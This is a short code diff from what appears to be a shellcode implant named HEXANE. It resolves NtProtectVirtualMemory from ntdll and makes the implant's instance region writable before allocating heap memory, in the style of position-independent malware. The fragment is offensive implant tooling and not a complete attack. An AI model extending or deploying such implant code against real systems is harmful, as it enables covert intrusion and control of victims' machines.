@@ -47,8 +47,11 @@ namespace Memory {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
             HEXANE;
 
-            _hexane instance    = { };
-            void *region        = { };
+            _hexane instance = { };
+            void *region     = { };
+
+			SIZE_T size   = sizeof(void*);
+			ULONG protect = 0;
 
             instance.teb    = NtCurrentTeb();
             instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -62,12 +65,15 @@ namespace Memory {
             }
 
             F_PTR_HMOD(instance.win32.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
-            if (!instance.win32.RtlAllocateHeap) {
+            F_PTR_HMOD(instance.win32.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY);
+            if (!instance.win32.RtlAllocateHeap || !instance.win32.NtProtectVirtualMemory) {
                 return false;
             }
 
             region = RVA(PBYTE, instance.base.address, &__instance);
-            if (!(C_DREF(region) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+
+			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &region, &size, PAGE_READWRITE, &protect)) ||
+				!(C_DREF(region) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return false;
             }
 
